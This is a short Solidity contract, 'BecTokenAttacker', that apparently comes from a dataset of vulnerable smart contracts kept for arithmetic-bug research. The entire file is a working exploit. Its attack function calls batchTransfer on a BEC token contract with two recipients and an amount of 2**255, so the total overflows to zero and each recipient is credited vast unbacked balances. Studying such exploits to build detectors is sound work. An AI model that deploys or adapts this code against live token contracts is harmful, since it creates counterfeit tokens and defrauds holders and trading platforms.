pragma solidity ^0.4.16;

import "../dataset/arithmetic/BECToken.sol";

contract BecTokenAttacker {
    BecToken public target;

    function attack(address _target) public {
        target = BecToken(_target);
        address[] memory recipients = new address[](2);
        recipients[0] = address(this);
        recipients[1] = address(0x0);

        uint256 max = 2**255;
        target.batchTransfer(recipients, max);
    }

}